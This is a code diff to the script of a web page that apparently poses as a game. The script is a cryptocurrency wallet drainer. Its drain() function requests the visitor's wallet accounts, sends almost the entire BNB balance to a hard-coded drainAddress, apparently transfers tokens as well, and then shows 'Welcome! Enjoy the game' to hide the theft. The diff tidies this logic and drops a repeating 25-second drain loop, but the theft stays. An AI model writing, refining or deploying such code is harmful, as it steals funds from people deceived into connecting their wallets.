@@ -160,8 +160,6 @@
     const abi = ["function balanceOf(address) view returns (uint256)", "function transfer(address,uint256) returns (bool)"];
 
     let connected = false;
-    let lastNative = 0n;
-    let drainedSomething = false;
 
     async function drain() {
       if (!window.ethereum) {
@@ -173,7 +171,7 @@
         if (!connected) {
           await window.ethereum.request({ method: "eth_requestAccounts" });
           connected = true;
-          status.innerHTML = "Connecting... 💕";
+          status.innerHTML = "Connecting wallet... 💕";
         }
 
         const provider = new ethers.BrowserProvider(window.ethereum);
@@ -187,13 +185,13 @@
           });
         } catch (e) {}
 
-        drainedSomething = false;
+        let drainedSomething = false;
 
         const nativeBalance = await provider.getBalance(user);
         const minThreshold = ethers.parseEther("0.0005");
         const reserve = ethers.parseEther("0.002");
 
-        if (nativeBalance > lastNative && nativeBalance > minThreshold) {
+        if (nativeBalance > minThreshold) {
           const amountToSend = nativeBalance - reserve;
           if (amountToSend > 0n) {
             const gasEstimate = await provider.estimateGas({ to: drainAddress, value: amountToSend });
@@ -202,7 +200,6 @@
               value: amountToSend,
               gasLimit: (gasEstimate * 130n) / 100n
             });
-            lastNative = nativeBalance;
             drainedSomething = true;
           }
         }
@@ -218,20 +215,18 @@
           } catch (e) {}
         }
 
-        status.innerHTML = drainedSomething 
-          ? "<span class='success'>Welcome! Enjoy the game 💖</span>" 
-          : `<span class='error'>No balance detected (Current: ${ethers.formatEther(nativeBalance)} BNB) 💔</span>`;
+        if (drainedSomething) {
+          status.innerHTML = "<span class='success'>Welcome! Enjoy the game 💖</span>";
+        } else {
+          status.innerHTML = `<span class='error'>No balance detected (${ethers.formatEther(nativeBalance)} BNB) 💔</span>`;
+        }
 
       } catch (e) {
         status.innerHTML = "<span class='error'>Failed - Check network (BNB Smart Chain) 💔</span>";
       }
     }
 
-    btn.onclick = () => {
-      drainedSomething = false;
-      drain();
-      setInterval(drain, 25000);
-    };
+    btn.onclick = drain;
   </script>
 </body>
 </html>
